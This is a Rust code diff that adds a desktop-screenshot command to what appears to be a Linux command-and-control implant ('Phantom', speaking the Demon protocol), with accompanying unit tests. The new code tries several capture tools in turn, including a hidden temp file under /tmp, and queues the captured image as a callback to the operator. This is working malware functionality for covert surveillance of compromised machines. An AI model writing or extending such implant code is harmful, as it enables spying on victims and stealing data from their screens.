@@ -874,6 +874,9 @@ pub(crate) async fn execute(
         DemonCommand::CommandPivot => {
             execute_pivot(package.request_id, &package.payload, state)?;
         }
+        DemonCommand::CommandScreenshot => {
+            execute_screenshot(package.request_id, state).await?;
+        }
         DemonCommand::CommandExit => {
             let mut parser = TaskParser::new(&package.payload);
             let exit_method = u32::try_from(parser.int32()?)
@@ -1089,6 +1092,135 @@ fn execute_pivot(
     }
 
     Ok(())
+}
+
+/// Handle `CommandScreenshot` (ID 2510): capture the Linux desktop.
+///
+/// Tries several capture methods in order of preference:
+/// 1. `import -window root png:-` (ImageMagick)
+/// 2. `scrot -o -` (scrot)
+/// 3. `gnome-screenshot -f <tmpfile>` (GNOME)
+/// 4. `xwd -root -silent` piped through `convert xwd:- png:-`
+///
+/// On success, sends a [`PendingCallback::Structured`] containing
+/// `[success:u32=1][image_bytes:len-prefixed]`.  On failure, sends
+/// `[success:u32=0]`.
+async fn execute_screenshot(request_id: u32, state: &mut PhantomState) -> Result<(), PhantomError> {
+    match capture_screenshot().await {
+        Ok(image_bytes) => {
+            let mut payload = encode_u32(1); // success = TRUE
+            payload.extend_from_slice(&encode_bytes(&image_bytes)?);
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandScreenshot),
+                request_id,
+                payload,
+            });
+        }
+        Err(error) => {
+            tracing::warn!(%error, "screenshot capture failed");
+            let payload = encode_u32(0); // success = FALSE
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandScreenshot),
+                request_id,
+                payload,
+            });
+        }
+    }
+
+    Ok(())
+}
+
+/// Attempt to capture a screenshot using available Linux tools.
+///
+/// Returns the raw PNG image bytes on success.
+async fn capture_screenshot() -> Result<Vec<u8>, PhantomError> {
+    // Method 1: ImageMagick `import`
+    if let Ok(output) = Command::new("import")
+        .args(["-window", "root", "png:-"])
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .output()
+        .await
+    {
+        if output.status.success() && !output.stdout.is_empty() {
+            tracing::debug!("screenshot captured via import (ImageMagick)");
+            return Ok(output.stdout);
+        }
+    }
+
+    // Method 2: scrot
+    if let Ok(output) = Command::new("scrot")
+        .args(["-o", "-"])
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .output()
+        .await
+    {
+        if output.status.success() && !output.stdout.is_empty() {
+            tracing::debug!("screenshot captured via scrot");
+            return Ok(output.stdout);
+        }
+    }
+
+    // Method 3: gnome-screenshot to a temp file
+    let tmp_path = "/tmp/.phantom_screenshot.png";
+    if let Ok(output) = Command::new("gnome-screenshot")
+        .args(["-f", tmp_path])
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .output()
+        .await
+    {
+        if output.status.success() {
+            if let Ok(data) = fs::read(tmp_path) {
+                let _ = fs::remove_file(tmp_path);
+                if !data.is_empty() {
+                    tracing::debug!("screenshot captured via gnome-screenshot");
+                    return Ok(data);
+                }
+            }
+        }
+    }
+    let _ = fs::remove_file(tmp_path);
+
+    // Method 4: xwd captured then piped through ImageMagick convert
+    if let Ok(xwd_output) = Command::new("xwd")
+        .args(["-root", "-silent"])
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .output()
+        .await
+    {
+        if xwd_output.status.success() && !xwd_output.stdout.is_empty() {
+            if let Ok(mut convert_child) = Command::new("convert")
+                .args(["xwd:-", "png:-"])
+                .stdin(Stdio::piped())
+                .stdout(Stdio::piped())
+                .stderr(Stdio::null())
+                .spawn()
+            {
+                // Write xwd data to convert's stdin, then collect output.
+                if let Some(mut stdin) = convert_child.stdin.take() {
+                    use tokio::io::AsyncWriteExt;
+                    let _ = stdin.write_all(&xwd_output.stdout).await;
+                    drop(stdin);
+                    if let Ok(convert_output) = convert_child.wait_with_output().await {
+                        if convert_output.status.success() && !convert_output.stdout.is_empty() {
+                            tracing::debug!("screenshot captured via xwd + convert");
+                            return Ok(convert_output.stdout);
+                        }
+                    }
+                } else {
+                    let _ = convert_child.wait().await;
+                }
+            }
+        }
+    }
+
+    Err(PhantomError::Screenshot(
+        "no screenshot tool available (tried import, scrot, gnome-screenshot, xwd+convert)"
+            .to_owned(),
+    ))
 }
 
 /// Connect to a child agent's Unix domain socket, read its init packet, and
@@ -4667,5 +4799,79 @@ mod tests {
         let mut offset = 0;
         let sub = read_u32(payload, &mut offset);
         assert_eq!(sub, u32::from(DemonPivotCommand::SmbDisconnect));
+    }
+
+    // --- CommandScreenshot tests ---
+
+    /// Sending a `CommandScreenshot` package through the dispatcher must produce
+    /// a `Structured` callback with `command_id == CommandScreenshot`.  The payload
+    /// starts with a success flag (u32).  In CI/test environments without a display
+    /// the flag will be 0 (failure) — that is fine; the important thing is that the
+    /// dispatcher routes the command and produces a well-formed response.
+    #[tokio::test]
+    async fn screenshot_dispatcher_routes_command_and_queues_callback() {
+        let mut state = PhantomState::default();
+        let package =
+            DemonPackage::new(DemonCommand::CommandScreenshot, 0x42, Vec::new());
+        let result = execute(&package, &mut state).await;
+        assert!(result.is_ok(), "execute must not return an error");
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1, "exactly one callback expected");
+        let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
+            panic!("expected Structured callback, got {:?}", callbacks[0]);
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandScreenshot));
+        assert_eq!(*request_id, 0x42);
+        // The first 4 bytes must be the success flag (0 or 1).
+        assert!(payload.len() >= 4, "payload must contain at least the success flag");
+        let mut offset = 0;
+        let success = read_u32(payload, &mut offset);
+        assert!(success <= 1, "success flag must be 0 or 1, got {success}");
+    }
+
+    /// When the screenshot succeeds (tested by mocking via a helper), the response
+    /// payload must be `[1:u32][len:u32][image_bytes]`.
+    #[tokio::test]
+    async fn screenshot_success_payload_format() {
+        let mut state = PhantomState::default();
+        // Construct a known-good structured callback as execute_screenshot would.
+        let fake_image = b"PNG_TEST_DATA";
+        let mut expected_payload = super::encode_u32(1);
+        expected_payload.extend_from_slice(&super::encode_bytes(fake_image).expect("encode_bytes"));
+        state.queue_callback(PendingCallback::Structured {
+            command_id: u32::from(DemonCommand::CommandScreenshot),
+            request_id: 0xAA,
+            payload: expected_payload.clone(),
+        });
+        let callbacks = state.drain_callbacks();
+        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
+            panic!("expected Structured");
+        };
+        let mut offset = 0;
+        let success = read_u32(payload, &mut offset);
+        assert_eq!(success, 1);
+        let image = read_bytes(payload, &mut offset);
+        assert_eq!(image, fake_image);
+    }
+
+    /// When screenshot capture fails, the response payload must be just `[0:u32]`.
+    #[tokio::test]
+    async fn screenshot_failure_payload_format() {
+        let mut state = PhantomState::default();
+        // Simulate failure: encode success=0 (same as execute_screenshot does).
+        let expected_payload = super::encode_u32(0);
+        state.queue_callback(PendingCallback::Structured {
+            command_id: u32::from(DemonCommand::CommandScreenshot),
+            request_id: 0xBB,
+            payload: expected_payload,
+        });
+        let callbacks = state.drain_callbacks();
+        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
+            panic!("expected Structured");
+        };
+        assert_eq!(payload.len(), 4, "failure payload must be exactly 4 bytes");
+        let mut offset = 0;
+        let success = read_u32(payload, &mut offset);
+        assert_eq!(success, 0);
     }
 }
